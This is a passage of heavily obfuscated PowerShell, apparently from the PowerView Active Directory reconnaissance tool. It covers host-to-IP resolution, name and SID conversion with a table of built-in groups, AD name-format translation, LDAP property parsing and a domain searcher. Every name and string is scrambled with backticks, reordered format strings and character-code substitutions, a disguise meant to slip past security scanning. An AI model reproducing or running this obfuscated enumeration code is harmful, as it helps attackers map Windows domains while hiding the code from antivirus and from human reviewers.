                ${V`Al`Ues} = ${vAl`UE}.("{1}{0}"-f 'lit','sp').Invoke(',') | &("{2}{4}{3}{1}{0}"-f 'Object','h-','Fo','c','rEa') {${_}.("{1}{0}" -f'm','Tri').Invoke()}
                if(${va`Lues} -isnot [System.Array]) {${v`ALU`Es} = @(${vA`lueS})}
                ${inI`obj`eCT}[${s`ecTI`on}][${N`AME}] = ${v`AlU`Es}
            }
        }
        ${INi`OBJ`ecT}
    }
}


filter GEt`-I`PAD`Dr`ESs {


    [CmdletBinding()]
    param(
        [Parameter(PosiTion=0, valUeFrOMpIPeLiNE=${t`Rue})]
        [Alias({"{2}{1}{0}"-f'me','a','HostN'})]
        [String]
        ${co`Mp`UTERnAme} = ${EN`V`:`COmpU`TeRnA`mE}
    )

    try {
        
        ${C`OMPUT`eR} = ${COmP`U`TEr`NamE} | &("{0}{1}{2}{3}" -f 'G','e','t-','NameField')

        
        @((  ${3`wEU`XD}::("{2}{1}{0}"-f'y','HostEntr','Get').Invoke(${C`Om`PuTer}))."a`dD`RES`slIst") | &("{4}{3}{0}{2}{1}"-f 'ac','Object','h-','rE','Fo') {
            if (${_}."Ad`D`RessFaMIlY" -eq ("{1}{3}{2}{0}" -f'work','Inter','et','N')) {
                ${O`Ut} = &("{0}{1}{2}" -f'Ne','w-Ob','ject') ("{1}{0}" -f 'Object','PS')
                ${O`UT} | &("{1}{0}{3}{2}"-f'dd-Me','A','er','mb') ("{2}{3}{1}{0}"-f 'erty','op','Not','epr') ("{2}{3}{0}{1}" -f 'Na','me','Compute','r') ${ComPU`T`ER}
                ${o`UT} | &("{0}{2}{1}"-f 'Add-Me','r','mbe') ("{3}{0}{2}{1}"-f 'pe','ty','r','Notepro') ("{0}{1}" -f'IP','Address') ${_}."IpAd`DReSStoS`TRI`NG"
                ${o`Ut}
            }
        }
    }
    catch {
        &("{1}{2}{0}{3}{4}" -f '-V','Wri','te','er','bose') -Message ("{3}{5}{4}{7}{2}{1}{0}{6}{8}{9}{10}" -f ' ','lve host to','so','Co',' ','uld not','an','re',' ','IP Address','.')
    }
}


filter conVE`Rt-N`Ame`T`OSiD {

    [CmdletBinding()]
    param(
        [Parameter(MaNDaToRY=${t`RUe}, VALUEfRompiPeLiNE=${tr`Ue})]
        [String]
        [Alias({"{0}{1}"-f'N','ame'})]
        ${O`BJ`ECTNAmE},

        [String]
        ${dO`m`AIn}
    )

    ${O`Bj`EcTNAmE} = ${o`BJeC`TNAme} -Replace "/","\"

    if(${OBj`EctN`AMe}.("{0}{1}" -f'Con','tains').Invoke("\")) {
        
        ${d`omaIn} = ${oBJ`eCtN`AmE}.("{1}{0}" -f't','Spli').Invoke("\")[0]
        ${O`BjeCtn`AMe} = ${o`BjeCTN`A`ME}.("{1}{0}" -f 'lit','Sp').Invoke("\")[1]
    }
    elseif(-not ${dOM`AIN}) {
        ${DOm`A`In} = (&("{0}{1}{2}{3}" -f'Ge','t-NetDom','a','in'))."n`AME"
    }

    try {
        ${o`Bj} = (&("{2}{1}{0}" -f 'bject','w-O','Ne') ("{6}{4}{5}{3}{1}{2}{0}"-f 't','ipal.N','TAccoun','c','cu','rity.Prin','System.Se')(${D`om`AiN}, ${OBj`E`CTNaME}))
        ${S`id} = ${O`BJ}."tr`AN`SLate"([System.Security.Principal.SecurityIdentifier])."v`ALuE"

        ${O`Ut} = &("{3}{2}{1}{0}"-f 'ect','bj','w-O','Ne') ("{0}{1}{2}" -f 'PSObj','ec','t')
        ${O`UT} | &("{2}{0}{3}{1}" -f'Mem','r','Add-','be') ("{2}{1}{0}" -f 'rty','eprope','Not') ("{2}{1}{0}"-f 'ectName','bj','O') ${o`Bj`eCt`NAmE}
        ${O`Ut} | &("{0}{1}{2}"-f 'A','dd-Mem','ber') ("{3}{2}{0}{1}"-f'ep','roperty','t','No') 'SID' ${S`Id}
        ${O`UT}
    }
    catch {
        &("{1}{0}{2}"-f'erbos','Write-V','e') ('Inva'+'l'+'id '+'object'+'/n'+'a'+'me: '+"$Domain\$ObjectName")
        ${n`UlL}
    }
}


filter Con`Ver`T-SiD`T`ONaMe {

    [CmdletBinding()]
    param(
        [Parameter(maNDatORy=${tR`UE}, ValUEFroMPipeLINE=${T`RuE})]
        [String]
        [ValidatePattern({"{0}{1}" -f'^S-','1-.*'})]
        ${s`Id}
    )

    try {
        ${sI`d2} = ${s`ID}.("{0}{1}"-f'tri','m').Invoke('*')

        
        
        Switch (${s`iD2}) {
            ("{0}{1}" -f'S-1','-0')         { ("{3}{2}{1}{0}"-f 'thority','Au',' ','Null') }
            ("{0}{1}"-f 'S','-1-0-0')       { ("{1}{0}" -f'y','Nobod') }
            ("{1}{0}" -f'-1','S-1')         { ("{0}{4}{1}{3}{2}"-f 'Wor','Auth','y','orit','ld ') }
            ("{0}{2}{1}"-f'S-1-','0','1-')       { ("{2}{0}{1}" -f 'eryon','e','Ev') }
            ("{1}{0}"-f'-1-2','S')         { ("{3}{0}{2}{1}"-f 'thori','y','t','Local Au') }
            ("{0}{2}{1}" -f'S-1-2','0','-')       { ("{1}{0}"-f 'cal','Lo') }
            ("{0}{1}" -f'S-','1-2-1')       { ("{3}{2}{0}{1}"-f'Logon',' ','ole ','Cons') }
            ("{0}{1}"-f 'S-','1-3')         { ("{4}{3}{2}{1}{0}"-f 'y','orit','uth','or A','Creat') }
            ("{1}{0}"-f'-0','S-1-3')       { ("{1}{0}{2}" -f'tor Own','Crea','er') }
            ("{0}{1}{2}" -f 'S-1-','3-','1')       { ("{1}{2}{0}"-f 'roup','Creato','r G') }
            ("{1}{0}" -f'-3-2','S-1')       { ("{5}{0}{1}{3}{2}{4}"-f 'ator ','Own','rve','er Se','r','Cre') }
            ("{1}{0}{2}"-f'3-','S-1-','3')       { ("{4}{2}{0}{1}{3}" -f 'or Grou','p','eat',' Server','Cr') }
            ("{0}{1}" -f'S-1-3','-4')       { ("{2}{3}{0}{1}"-f 't','s','Ow','ner Righ') }
            ("{1}{0}" -f '-1-4','S')         { ("{1}{4}{2}{3}{0}"-f 'ity','Non-uniqu','h','or','e Aut') }
            ("{1}{0}" -f '-5','S-1')         { ("{2}{0}{1}{3}"-f'i','t','NT Author','y') }
            ("{0}{1}"-f 'S-1-','5-1')       { ("{0}{1}"-f'D','ialup') }
            ("{0}{2}{1}" -f 'S-1','5-2','-')       { ("{0}{2}{1}" -f 'Ne','work','t') }
            ("{0}{1}" -f 'S-','1-5-3')       { ("{1}{0}"-f'h','Batc') }
            ("{2}{0}{1}" -f '-5-','4','S-1')       { ("{2}{1}{3}{0}" -f'ive','t','In','eract') }
            ("{2}{1}{0}"-f '-5-6','1','S-')       { ("{1}{0}" -f 'ice','Serv') }
            ("{0}{2}{1}"-f 'S-1-5','7','-')       { ("{2}{1}{0}" -f'nymous','o','An') }
            ("{1}{0}"-f'1-5-8','S-')       { ("{1}{0}" -f'xy','Pro') }
            ("{0}{2}{1}"-f 'S-','9','1-5-')       { ("{1}{0}{3}{4}{2}{5}"-f 'terprise Doma','En','ller','in ','Contro','s') }
            ("{0}{1}{2}" -f 'S','-1-5-','10')      { ("{3}{1}{2}{0}"-f 'Self','inci','pal ','Pr') }
            ("{1}{0}{2}" -f'-1-5-','S','11')      { ("{1}{2}{3}{4}{0}" -f'rs','Auth','enticate','d U','se') }
            ("{1}{0}{2}" -f '-1-5','S','-12')      { ("{3}{0}{1}{4}{2}" -f'icted C','o','e','Restr','d') }
            ("{0}{1}{2}"-f'S-1','-5','-13')      { ("{3}{5}{4}{2}{0}{1}"-f'rver Use','rs','Se','Termin',' ','al') }
            ("{1}{0}" -f '14','S-1-5-')      { ("{1}{3}{4}{0}{6}{5}{2}" -f'er','Rem','on','ote ','Int','g','active Lo') }
            ("{1}{2}{0}" -f'15','S-','1-5-')      { ("{4}{1}{3}{0}{2}"-f'ati','is Organ','on ','iz','Th') }
            ("{0}{2}{1}" -f 'S','-5-17','-1')      { ("{4}{0}{2}{3}{1}" -f 'Or','ization ','ga','n','This ') }
            ("{1}{2}{0}"-f '8','S-1','-5-1')      { ("{1}{2}{0}" -f'm','Local Syst','e') }
            ("{1}{0}" -f '-1-5-19','S')      { ("{1}{0}{2}{3}"-f 'th','NT Au','o','rity') }
            ("{0}{1}" -f 'S-1-5-','20')      { ("{1}{2}{0}"-f 'thority','NT ','Au') }
            ("{1}{2}{0}"-f'0','S','-1-5-80-')    { ("{1}{0}{2}{3}" -f' ','All','Ser','vices ') }
            ("{1}{2}{3}{0}"-f '544','S','-','1-5-32-')  { ((("{1}{3}{4}{2}{0}{5}" -f 'n','BUI','GTAdmi','LT','INM','istrators'))."RePla`ce"(([ChaR]77+[ChaR]71+[ChaR]84),'\')) }
            ("{1}{0}{3}{2}"-f'-','S-1-5-32','45','5')  { ((("{1}{3}{0}{2}"-f 'ILTIN43uUs','B','ers','U')) -crEpLAcE([char]52+[char]51+[char]117),[char]92) }
            ("{1}{2}{0}" -f '2-546','S-','1-5-3')  { ((("{3}{2}{1}{0}"-f'{0}Guests','IN','T','BUIL'))-f  [CHaR]92) }
            ("{3}{2}{1}{0}" -f '-32-547','-5','1','S-')  { ((("{0}{3}{2}{1}{4}"-f'BUI','r Use','N{0}Powe','LTI','rs'))-F [char]92) }
            ("{0}{2}{1}" -f'S-','-32-548','1-5')  { ((("{2}{1}{3}{0}{4}"-f 'at','ILTIN{0}Ac','BU','count Oper','ors'))  -F[cHAr]92) }
            ("{1}{2}{0}{3}" -f '2-','S-1-','5-3','549')  { ((("{3}{0}{1}{2}" -f'T5GServ','e','r Operators','BUILTIN'))."rE`pLaCe"(([cHaR]84+[cHaR]53+[cHaR]71),[StRIng][cHaR]92)) }
            ("{0}{1}{2}{3}"-f 'S-1','-5-32-','5','50')  { ((("{4}{3}{0}{1}{2}{6}{5}" -f'INv','rpPri','nt Opera','ILT','BU','rs','to'))-crEpLaCE  'vrp',[cHar]92) }
            ("{2}{1}{0}{3}"-f '5','-5-32-5','S-1','1')  { ((("{1}{6}{8}{5}{3}{4}{2}{0}{7}" -f 'or','BU','rat','B','ackup Ope','TIN{0}','I','s','L')) -F [CHAr]92) }
            ("{1}{3}{0}{2}" -f'-5-','S-','32-552','1')  { ((("{0}{2}{4}{5}{1}{3}" -f 'BU','icato','ILTINa8zRe','rs','p','l'))."r`ePL`ACE"(([ChAR]97+[ChAR]56+[ChAR]122),[sTrIng][ChAR]92)) }
            ("{3}{1}{2}{0}" -f'54','-','5','S-1-5-32')  { ((("{6}{5}{10}{9}{2}{1}{4}{0}{3}{8}{7}" -f ' Com','ws','do','patible A',' 2000','Pre-','BUILTINANL','cess','c','n','Wi'))."r`ePLace"('ANL',[StrIng][char]92)) }
            ("{2}{1}{0}" -f '5','2-55','S-1-5-3')  { ((("{1}{4}{3}{7}{2}{0}{6}{5}"-f 'o','BUI','emote Deskt','N','LTI',' Users','p','OzbR'))."R`EpLacE"(([cHAR]79+[cHAR]122+[cHAR]98),'\')) }
            ("{3}{2}{1}{0}" -f '6','5','2-5','S-1-5-3')  { ((("{2}{10}{12}{0}{4}{11}{1}{5}{3}{8}{7}{9}{6}" -f'N','work C','BU','nfigura','e','o','ors','on ','ti','Operat','ILT','t','INSNb')) -replAcE  ([cHaR]83+[cHaR]78+[cHaR]98),[cHaR]92) }
            ("{2}{3}{1}{0}"-f '7','55','S-1','-5-32-')  { ((("{7}{10}{0}{8}{3}{2}{9}{1}{5}{11}{6}{4}"-f 'TI','s',' ','Incoming','s','t ','rust Builder','BU','NU1z','Fore','IL','T')).("{1}{0}"-f'epLaCe','r').Invoke('U1z','\')) }
            ("{0}{2}{1}{3}" -f'S-1','-32-','-5','558')  { ((("{1}{7}{6}{5}{0}{4}{8}{2}{3}"-f'e M','BUILTIN{0}Per','r U','sers','onit','nc','ma','for','o'))-f[CHar]92) }
            ("{2}{1}{0}"-f'-559','5-32','S-1-')  { ((("{0}{2}{5}{1}{3}{4}"-f'B','Performance Lo','UILTIN','g Us','ers','{0}')) -F[Char]92) }
            ("{1}{2}{0}" -f '32-560','S-1','-5-')  { ((("{9}{10}{7}{11}{8}{3}{2}{1}{4}{0}{5}{6}" -f'i','o','s Auth','dow','rizat','on ','Access Group','ILT','GWin','B','U','INQd')) -repLaCE ([CHAR]81+[CHAR]100+[CHAR]71),[CHAR]92) }
            ("{2}{3}{1}{0}" -f '-32-561','-5','S','-1')  { ((("{5}{8}{3}{2}{7}{4}{0}{1}{6}"-f 'r Licens','e Server','x0vTerminal ','ILTIN','e','B','s','Serv','U')).("{2}{0}{1}" -f 'PLAC','e','RE').Invoke('x0v','\')) }
            ("{3}{2}{0}{1}"-f '2','-562','-3','S-1-5')  { ((("{0}{5}{3}{8}{1}{4}{9}{7}{2}{6}"-f 'B','N','tribu','T','y7mD','UIL','ted COM Users','s','I','i'))."re`PLAcE"('y7m',[strinG][cHar]92)) }
            ("{0}{3}{2}{1}"-f 'S-1-','69','-32-5','5')  { ((("{0}{2}{4}{8}{9}{3}{1}{6}{5}{10}{7}"-f 'BUILT','og','INwJ','t','4Cr','i','raph','perators','y','p','c O'))."repLA`cE"(([CHAR]119+[CHAR]74+[CHAR]52),'\')) }
            ("{1}{2}{0}"-f'-573','S-1-5-','32')  { ((("{4}{0}{5}{2}{3}{1}"-f'LT','aders','ent Lo','g Re','BUI','IN0LMEv'))-rEpLacE ([cHar]48+[cHar]76+[cHar]77),[cHar]92) }
            ("{2}{0}{3}{1}" -f'-1-5-3','4','S','2-57')  { ((("{7}{1}{9}{6}{2}{3}{4}{8}{0}{5}" -f's','U','e Servi','ce DCO','M Ac','s','TINVk6Certificat','B','ce','IL'))-CRepLaCe ([cHar]86+[cHar]107+[cHar]54),[cHar]92) }
            ("{3}{2}{1}{0}" -f '5','32-57','1-5-','S-')  { ((("{0}{2}{3}{6}{1}{4}{5}"-f'BUILTIN{','r','0}RDS R','emote Access S','ve','rs','e'))  -f[ChAr]92) }
            ("{1}{0}{2}{3}" -f '5','S-1-','-32-57','6')  { ((("{6}{5}{2}{0}{1}{4}{3}"-f' Endpoi','nt Se','{0}RDS','vers','r','N','BUILTI'))-f [CHAR]92) }
            ("{1}{2}{0}" -f '577','S-1','-5-32-')  { ((("{1}{3}{2}{0}" -f 'nagement Servers','BU','a','ILTIN{0}RDS M'))  -F[CHAR]92) }
            ("{1}{2}{0}{3}"-f '-32-5','S-','1-5','78')  { ((("{6}{2}{5}{9}{7}{8}{4}{1}{0}{3}" -f 'istrat','r-V Admin','ILTI','ors','e','N','BU','K','Hyp','1G'))."rE`placE"('1GK',[strINg][ChAR]92)) }
            ("{2}{3}{0}{1}"-f'2-','579','S-1','-5-3')  { ((("{0}{8}{4}{7}{9}{12}{5}{1}{11}{6}{2}{10}{3}"-f'B','ntr',' Ope','ators','ILTIN',' Co','ssistance','N','U','rvA','r','ol A','ccess'))  -CREPlAcE ([chaR]78+[chaR]114+[chaR]118),[chaR]92) }
            ("{0}{1}{2}"-f'S-1','-','5-32-580')  { ((("{1}{5}{2}{7}{0}{3}{6}{4}" -f'ce','BUILTINAg','cess Control',' Ope','ors','4Ac','rat',' Assistan'))."RE`PLace"('Ag4',[sTRinG][char]92)) }
            ("{2}{0}{1}"-f 'faul','t','De') {
                ${O`Bj} = (&("{2}{0}{1}"-f 'w-Objec','t','Ne') ("{2}{3}{5}{1}{4}{6}{0}{7}"-f 'd','pal.Securit','Syst','em.Security','y','.Princi','I','entifier')(${s`ID2}))
                ${O`BJ}."t`RaN`sLaTE"( [System.Security.Principal.NTAccount])."v`AlUE"
            }
        }
    }
    catch {
        &("{1}{0}{2}" -f 'ite-Ve','Wr','rbose') ('I'+'nva'+'lid '+'S'+'ID: '+"$SID")
        ${s`id}
    }
}


filter cONve`R`T-Adna`ME {

    [CmdletBinding()]
    param(
        [Parameter(MAndaTOry=${T`RuE}, ValuefroMpiPeLINe=${t`RUE})]
        [String]
        ${o`BJECtNa`me},

        [String]
        [ValidateSet("NT4","DN",{"{0}{1}{2}" -f 'S','i','mple'},{"{1}{2}{0}"-f'onical','C','an'})]
        ${I`Np`UttYpe},

        [String]
        [ValidateSet("NT4","DN",{"{2}{1}{0}"-f 'ple','im','S'},{"{1}{2}{0}" -f'l','Canoni','ca'})]
        ${O`Ut`PUt`TYpE}
    )

    ${NaM`et`Y`PeS} = @{
        'DN'        = 1
        ("{1}{2}{3}{0}" -f 'onical','C','a','n') = 2
        'NT4'       = 3
        ("{0}{1}" -f 'Simpl','e')    = 5
    }

    if(-not ${pSBoUND`P`A`Ramet`eRs}[("{2}{1}{0}"-f'Type','nput','I')]) {
        if( (${ObjECtn`A`mE}.("{0}{1}" -f'spli','t').Invoke('/'))."c`OUnt" -eq 2 ) {
            ${oBj`eCTN`AMe} = ${O`BjEctna`mE}.("{0}{1}"-f 're','place').Invoke('/', '\')
        }

        if(${OBJec`T`NamE} -match ((("{1}{0}{4}{3}{2}" -f']+{0}{0}[A','^[A-Za-z','z ]+','-','-Za'))  -f  [ChaR]92)) {
            ${Inp`Ut`TYPE} = 'NT4'
        }
        elseif(${ObjEC`TNa`ME} -match ((("{3}{4}{6}{0}{5}{1}{2}" -f'+@','Za-','zjbp.]+','^[','A-Za','[A-','-z ]'))-RePLACe  'jbp',[CHaR]92)) {
            ${inPU`Tt`Ype} = ("{0}{1}"-f 'Simp','le')
        }
        elseif(${objectn`A`ME} -match ((("{6}{4}{2}{5}{1}{3}{0}" -f ']+','-z','0}','/ ','A-Za-z{','.]+/[A-Za-z]+/[A-Za','^['))  -f [chaR]92)) {
            ${inpUT`Ty`PE} = ("{2}{1}{0}"-f'ical','n','Cano')
        }
        elseif(${objE`c`T`NAmE} -match ("{1}{0}" -f'=.*','^CN')) {
            ${IN`pu`Tty`pe} = 'DN'
        }
        else {
            &("{0}{2}{1}" -f'Writ','ning','e-War') ('C'+'an '+'not'+' '+'ide'+'n'+'tify '+'InT'+'y'+'pe '+'fo'+'r '+"$ObjectName")
        }
    }
    elseif(${INp`U`TT`yPe} -eq 'NT4') {
        ${O`BJeCt`NAmE} = ${ob`J`ECtNamE}.("{0}{1}{2}" -f 'repl','ac','e').Invoke('/', '\')
    }

    if(-not ${PsBou`NDPaRa`M`eters}[("{2}{1}{0}" -f'tType','tpu','Ou')]) {
        ${OUT`PUT`TyPe} = Switch(${iNpuTt`y`Pe}) {
            'NT4' {("{1}{2}{0}" -f 'nical','Can','o')}
            ("{1}{0}" -f'e','Simpl') {'NT4'}
            'DN' {'NT4'}
            ("{0}{2}{1}" -f 'Cano','l','nica') {'NT4'}
        }
    }

    
    ${Do`mA`IN} = Switch(${InP`UtT`Y`pe}) {
        'NT4' { ${o`BjEcTNa`me}.("{0}{1}"-f'spli','t').Invoke("\")[0] }
        ("{2}{0}{1}"-f 'i','mple','S') { ${ob`JECTn`AMe}.("{1}{0}" -f'lit','sp').Invoke("@")[1] }
        ("{2}{0}{1}" -f'non','ical','Ca') { ${OB`jEc`TNA`Me}.("{0}{1}" -f'spli','t').Invoke("/")[0] }
        'DN' {${oBJ`e`ctN`AMe}.("{2}{0}{1}"-f 't','ring','subS').Invoke(${OB`JecTn`AMe}.("{2}{1}{0}" -f'f','exO','Ind').Invoke('DC=')) -replace 'DC=','' -replace ',','.'}
    }

    
    function iNVo`k`e`-M`eTHoD([__ComObject] ${ob`j`ecT}, [String] ${Met`hOd}, ${p`A`RA`METeRS}) {
        ${OU`TP`UT} = ${O`B`jeCt}.("{0}{1}"-f 'GetT','ype').Invoke().("{3}{0}{1}{2}" -f'okeM','e','mber','Inv').Invoke(${M`E`Thod}, ("{3}{2}{1}{0}"-f'd','Metho','voke','In'), ${nu`lL}, ${Ob`jE`Ct}, ${PaRa`meT`ers})
        if ( ${O`U`TPUT} ) { ${ou`TP`UT} }
    }
    function s`e`T-p`RopErtY([__ComObject] ${OB`j`eCT}, [String] ${pR`o`PertY}, ${par`AM`ETerS}) {
        [Void] ${o`BjE`CT}.("{0}{1}" -f 'GetTy','pe').Invoke().("{0}{2}{1}{3}" -f'Invo','emb','keM','er').Invoke(${p`ROp`e`Rty}, ("{0}{1}{2}" -f 'SetPro','p','erty'), ${n`Ull}, ${oBJe`cT}, ${Pa`RAM`E`TerS})
    }

    ${trA`N`sl`AtE} = &("{2}{1}{0}" -f 'Object','ew-','N') -ComObject ("{2}{4}{0}{3}{1}"-f'm','slate','N','eTran','a')

    try {
        &("{1}{2}{0}" -f'ke-Method','In','vo') ${tr`A`N`SLAte} ("{1}{0}" -f 't','Ini') (1, ${dO`m`Ain})
    }
    catch [System.Management.Automation.MethodInvocationException] {
        
    }

    &("{3}{2}{0}{1}" -f 'pe','rty','Pro','Set-') ${Tr`ANs`lAte} ("{0}{1}{3}{2}" -f 'C','ha','erral','seRef') (0x60)

    try {
        &("{3}{2}{0}{1}"-f'e-','Method','k','Invo') ${trA`NS`latE} "Set" (${namET`Yp`es}[${i`NpUtTY`PE}], ${oBJE`C`TnAME})
        (&("{1}{3}{0}{2}{4}"-f'M','In','etho','voke-','d') ${TRanS`LA`Te} "Get" (${Na`metYP`Es}[${oUTp`UtT`YPE}]))
    }
    catch [System.Management.Automation.MethodInvocationException] {
        
    }
}


filter geT`-N`AM`EFIELd {

    [CmdletBinding()]
    param(
        [Parameter(ValUefROmpiPEline = ${t`RUe}, valUEfROMpIPeLInEbYPROpERtYname = ${tR`Ue})]
        [Object]
        ${Obj`ECT},

        [Parameter(VaLUefRompipeliNEBypROPertYnAme = ${Tr`UE})]
        [String]
        ${d`NsHos`TnA`Me},

        [Parameter(VAlUeFrOmPiPELINEbypRopErtYNaME = ${t`RUe})]
        [String]
        ${n`AmE}
    )

    if(${pSbo`UndpARAM`eT`ers}[("{1}{2}{0}"-f'tName','DnsHo','s')]) {
        ${D`N`shOsT`NAme}
    }
    elseif(${ps`BoUn`dp`A`RaMeTers}[("{1}{0}" -f'ame','N')]) {
        ${N`Ame}
    }
    elseif(${OB`j`Ect}) {
        if ( [bool](${Obj`e`CT}."PsOBj`eCT"."Pr`OPE`RTIes"."N`AMe" -match ("{2}{1}{3}{0}" -f'me','stn','dnsho','a')) ) {
            
            ${o`Bje`CT}."Dn`S`hO`STNAmE"
        }
        elseif ( [bool](${OBjE`cT}."psobJ`eCT"."P`ROPERtI`eS"."nA`ME" -match ("{1}{0}"-f 'ame','n')) ) {
            
            ${ObJ`E`Ct}."na`Me"
        }
        else {
            
            ${OB`jECt}
        }
    }
    else {
        return ${N`ULl}
    }
}


function conVErt`-ld`A`PPROPE`Rty {

    param(
        [Parameter(manDatORy=${t`RUe}, ValuEfROmpipElinE=${T`RuE})]
        [ValidateNotNullOrEmpty()]
        ${PRoP`E`RtIeS}
    )

    ${Ob`JE`ctP`ROPE`Rt`iES} = @{}

    ${PR`Op`ErTies}."PROPe`R`Ty`NaM`es" | &("{2}{1}{3}{0}" -f 't','-O','ForEach','bjec') {
        if ((${_} -eq ("{2}{0}{1}"-f 'bj','ectsid','o')) -or (${_} -eq ("{2}{0}{1}"-f 'hi','story','sid'))) {
            
            ${obj`ec`TPRopERTI`Es}[${_}] = (&("{3}{0}{1}{2}"-f'-Ob','je','ct','New') ("{4}{12}{9}{1}{2}{0}{5}{8}{7}{11}{6}{10}{3}"-f 'l.Sec','.P','rincipa','ier','Sys','u','t','ityIde','r','rity','if','n','tem.Secu')(${Pr`OpErT`I`es}[${_}][0],0))."va`lUe"
        }
        elseif(${_} -eq ("{2}{0}{1}"-f'bje','ctguid','o')) {
            
            ${OBjECT`P`RO`pe`R`TIEs}[${_}] = (&("{2}{1}{0}" -f'ct','ew-Obje','N') ("{1}{0}" -f'id','Gu') (,${PR`oper`TIEs}[${_}][0]))."gu`id"
        }
        elseif( (${_} -eq ("{0}{2}{1}" -f'l','ogon','astl')) -or (${_} -eq ("{0}{1}{3}{2}"-f'las','tlog','mp','ontimesta')) -or (${_} -eq ("{3}{0}{2}{1}" -f 'wd','stset','la','p')) -or (${_} -eq ("{2}{1}{0}"-f 'goff','stlo','la')) -or (${_} -eq ("{1}{3}{2}{0}" -f 'ime','badPas','ordT','sw')) ) {
            
            if (${pR`opeRt`iES}[${_}][0] -is [System.MarshalByRefObject]) {
                
                ${T`eMP} = ${PRo`P`eRtI`Es}[${_}][0]
                [Int32]${HI`Gh} = ${tE`mP}.("{0}{2}{1}"-f'G','tType','e').Invoke().("{3}{2}{0}{1}" -f'b','er','nvokeMem','I').Invoke(("{1}{0}" -f'Part','High'),   ${pN`EYm}::"geTp`Rop`eRTy", ${Nu`ll}, ${te`mp}, ${N`Ull})
                [Int32]${L`oW}  = ${T`Emp}.("{2}{0}{1}"-f 'tTy','pe','Ge').Invoke().("{0}{1}{2}"-f'Inv','okeMe','mber').Invoke(("{2}{0}{1}" -f 'owPa','rt','L'),    (  &("{0}{1}{2}"-f 'G','Et-V','ARIablE')  ("Pn"+"eYM"))."va`lUE"::"gET`Pro`PErty", ${nU`lL}, ${tE`MP}, ${Nu`Ll})
                ${ob`J`ec`TProPerTI`eS}[${_}] = ( (&("{1}{2}{0}" -f'ABLE','Var','i') eoY0x1 -VALu )::"FrOM`Fi`let`Ime"([Int64]("0x{0:x8}{1:x8}" -f ${H`igH}, ${l`OW})))
            }
            else {
                ${o`BJ`e`ctPrOPERTI`ES}[${_}] = ( (&("{2}{0}{1}" -f'i','AbLE','Var') ('eo'+'y0X1')  -VALuEon  )::"fro`mFIle`T`Ime"((${P`ROp`ErtIEs}[${_}][0])))
            }
        }
        elseif(${pr`o`pe`RTieS}[${_}][0] -is [System.MarshalByRefObject]) {
            
            ${PR`OP} = ${pr`Ope`RtiEs}[${_}]
            try {
                ${t`EMP} = ${p`ROP}[${_}][0]
                &("{1}{2}{0}" -f '-Verbose','Writ','e') ${_}
                [Int32]${H`igh} = ${T`eMp}.("{0}{1}"-f 'Ge','tType').Invoke().("{3}{2}{0}{1}" -f'b','er','okeMem','Inv').Invoke(("{2}{0}{1}"-f'Pa','rt','High'),  ${pn`EYM}::"get`P`Rope`Rty", ${n`Ull}, ${t`eMp}, ${N`ULl})
                [Int32]${L`oW}  = ${T`EMp}.("{1}{0}"-f 'tType','Ge').Invoke().("{3}{2}{1}{0}" -f'er','Memb','nvoke','I').Invoke(("{0}{1}" -f 'LowP','art'),   ${p`NEYM}::"gEtpROp`ER`Ty", ${nU`LL}, ${te`Mp}, ${N`ULl})
                ${obJEC`TPrOpE`R`TieS}[${_}] = [Int64]("0x{0:x8}{1:x8}" -f ${hI`gH}, ${l`oW})
            }
            catch {
                ${o`BJectpRo`Pe`R`Ties}[${_}] = ${pr`OP}[${_}]
            }
        }
        elseif(${p`RoPEr`TI`eS}[${_}]."c`OuNT" -eq 1) {
            ${o`BjE`CtPro`pe`RtIeS}[${_}] = ${pr`OPeRtI`es}[${_}][0]
        }
        else {
            ${oB`j`E`CTproPErtIeS}[${_}] = ${PrO`pErtI`ES}[${_}]
        }
    }

    &("{2}{1}{0}"-f 'ct','e','New-Obj') -TypeName ("{1}{0}"-f 'ct','PSObje') -Property ${O`B`JectprO`perT`ies}
}









filter gET-doM`A`I`NSe`A`RChEr {


    param(
        [Parameter(VaLuEfroMpIpElINE=${tr`Ue})]
        [String]
        ${DoM`AIn},

        [String]
        ${DOMA`InCOntr`o`l`ler},

        [String]
        ${ad`SpA`TH},

        [String]
        ${aDS`pRe`FIx},

        [ValidateRange(1,10000)]
        [Int]
        ${pa`GE`S`IZe} = 200,

        [Management.Automation.PSCredential]
        ${cREDen`TI`AL}
    )

    if(-not ${cR`eDeN`TI`Al}) {
        if(-not ${D`om`AIN}) {
            ${d`oM`AiN} = (&("{3}{2}{0}{1}"-f 'ma','in','t-NetDo','Ge'))."Na`Me"
        }
        elseif(-not ${dOmA`IN`C`onTrollER}) {
            try {
                
                ${dOmAiNCO`N`T`RO`l`lER} = ((&("{1}{0}{2}" -f '-Net','Get','Domain'))."Pd`CR`Ol`EOwNeR")."nA`mE"
            }
            catch {
                throw ("{0}{1}{8}{11}{9}{7}{10}{6}{2}{3}{5}{12}{4}"-f'Ge','t-Do','trievi','ng ','domain','PDC for curr','n re','r','mainSe','r: Er','or i','arche','ent ')
            }
        }
    }
    elseif (-not ${D`o`M`AINcONTROL`LER}) {
        
        try {
            ${DOM`Ai`NCoN`TRoL`lEr} = ((&("{0}{1}{2}{3}" -f'G','et','-NetD','omain') -Credential ${CrEd`e`NTiaL})."p`dCr`OLEO`Wner")."Na`ME"
        }
        catch {
            throw ("{10}{11}{4}{8}{3}{2}{6}{5}{9}{0}{7}{1}" -f ' ','in','ror in retriev',': Er','ea',' PDC for cur','ing','doma','rcher','rent','Get-','DomainS')
        }

        if(!${domAi`NC`on`T`RoLleR}) {
            throw ("{6}{11}{2}{5}{8}{7}{9}{4}{10}{1}{3}{0}"-f 'in','t do','-Do','ma','r','mainS','Ge','r: Error ','earche','in ret','ieving PDC for curren','t')
        }
    }

    ${Se`ArChsTRi`Ng} = ("{2}{1}{0}" -f'://','DAP','L')

    if(${DOmaI`Nc`o`Nt`R`olleR}) {
        ${SearCHS`T`R`I`Ng} += ${d`OMa`i`NCOnTRO`L`ler}
        if(${Dom`AIN}){
            ${s`ea`RChst`RING} += '/'
        }
    }

    if(${A`d`sprEfIx}) {
        ${SEArc`HS`TRi`NG} += ${ad`SP`RefiX} + ','
    }

    if(${a`DSPAth}) {
        if(${a`dSp`AtH} -Match ("{0}{1}{2}" -f'^','GC:','//')) {
            
            ${D`N} = ${Ads`pATh}.("{2}{1}{0}"-f'pper','U','To').Invoke().("{0}{1}" -f'Tri','m').Invoke('/')
            ${sE`ARchS`TR`iNg} = ''
        }
        else {
            if(${AD`Spa`TH} -match ("{0}{1}"-f'^L','DAP://')) {
